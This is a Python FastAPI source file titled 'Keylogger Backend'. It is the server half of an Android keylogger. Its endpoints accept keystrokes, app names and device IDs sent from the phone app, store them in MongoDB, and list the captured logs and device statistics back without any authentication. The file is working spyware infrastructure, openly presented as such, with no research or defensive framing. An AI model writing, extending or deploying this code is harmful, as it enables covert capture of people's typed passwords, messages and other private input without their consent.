from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional
from datetime import datetime
import os
from dotenv import load_dotenv
import motor.motor_asyncio
from bson import ObjectId

load_dotenv()

app = FastAPI(title="Keylogger Backend")

# CORS settings - Allow all origins for testing
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# MongoDB connection
MONGO_URI = os.getenv("MONGO_URI", "mongodb://localhost:27017")
client = motor.motor_asyncio.AsyncIOMotorClient(MONGO_URI)
database = client.keylogger_db
logs_collection = database.keylogs

# Models
class KeylogEntry(BaseModel):
    appName: str
    keystrokes: str
    deviceId: str
    timestamp: Optional[datetime] = None

# Routes
@app.get("/")
async def root():
    return {"message": "Keylogger API is running", "status": "active"}

@app.post("/api/keylog")
async def receive_keystroke(entry: KeylogEntry):
    """Receive keystrokes from the Android app"""
    try:
        if not entry.timestamp:
            entry.timestamp = datetime.now()
        
        result = await logs_collection.insert_one(entry.dict())
        return {
            "success": True,
            "id": str(result.inserted_id),
            "message": "Keystrokes saved successfully"
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/logs")
async def get_logs(limit: int = 100):
    """Get recent keystroke logs"""
    try:
        cursor = logs_collection.find().sort("timestamp", -1).limit(limit)
        logs = []
        async for doc in cursor:
            doc["id"] = str(doc["_id"])
            del doc["_id"]
            logs.append(doc)
        return logs
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/stats")
async def get_stats():
    """Get basic statistics"""
    try:
        total = await logs_collection.count_documents({})
        devices = await logs_collection.distinct("deviceId")
        return {
            "total_keystrokes": total,
            "unique_devices": len(devices),
            "devices": devices
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)